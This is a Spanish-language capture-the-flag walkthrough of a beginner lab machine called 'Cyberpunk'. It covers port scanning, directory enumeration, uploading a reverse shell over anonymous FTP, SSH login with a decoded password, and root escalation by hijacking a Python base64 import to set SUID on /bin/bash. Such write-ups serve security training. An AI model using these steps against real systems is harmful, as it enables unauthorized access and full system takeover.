---
description: '🔍 Dificultad: Principiante'
---

# Cyberpunk

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.78
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (722).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.78
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (723).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 21** perteneciente al **servicio FTP**, el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p21,22,80 -v 192.168.1.78
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Ingresamos la IP y nos encontramos la página con una imagen de una chica hacker.

<figure><img src="../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml,js -u http://192.168.1.78
```

<figure><img src="../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

Encontramos un archivo interesante llamado `secret.txt`.

<figure><img src="../../.gitbook/assets/image (727).png" alt=""><figcaption></figcaption></figure>

Voy a indagar al servicio **FTP** a través del usuario **anonymous** ya que hemos visto que tenemos acceso.

<figure><img src="../../.gitbook/assets/image (729).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Al descargar estos archivos nos damos cuenta que es el mismo contenido que la página web por lo que subiremos una **revshell**. Nos ponemos en escucha, establecemos la conexión y revisamos que ya hemos establecido la conexión.

<figure><img src="../../.gitbook/assets/image (730).png" alt=""><figcaption></figcaption></figure>

Tras ponerme en escucha y realizar tratamiento de la TTY. Como se nos muestra aquí: [Tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/). Listamos el contenido de varios directorios y encontramos un archivo en el directorio `/opt`.

<figure><img src="../../.gitbook/assets/image (731).png" alt=""><figcaption></figcaption></figure>

Es un código **Brainfuck** así que vamos a desencriptar.&#x20;

<figure><img src="../../.gitbook/assets/image (732).png" alt=""><figcaption></figcaption></figure>

Hemos descubierto la contraseña del usuario **arasaka**. Sabiendo esto, nos conectamos a través de **SSH** al usuario con el comando:

```bash
ssh arasaka@192.168.1.78
```

<figure><img src="../../.gitbook/assets/image (733).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (736).png" alt=""><figcaption></figcaption></figure>

Listamos permisos ocultos con `ls -la`.&#x20;

<figure><img src="../../.gitbook/assets/image (734).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (735).png" alt=""><figcaption></figcaption></figure>

Como observamos que el archivo utiliza la biblioteca `base64` de manera relativa, procederemos a crear un archivo llamado `base64.py` . Luego, le otorgaremos permisos de ejecución para que podamos aprovecharlo cuando se ejecute con privilegios de `sudo`.

```bash
import os;
os.system("chmod u+s /bin/bash")
```

Ejecutamos el script con permisos de **root**.

```bash
sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py
```

Vemos los permisos y ejecutamos los siguientes comandos:

```bash
ls -la /bin/bash
bash -p
```

Ya somos **root**.

<figure><img src="../../.gitbook/assets/image (737).png" alt=""><figcaption></figcaption></figure>

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
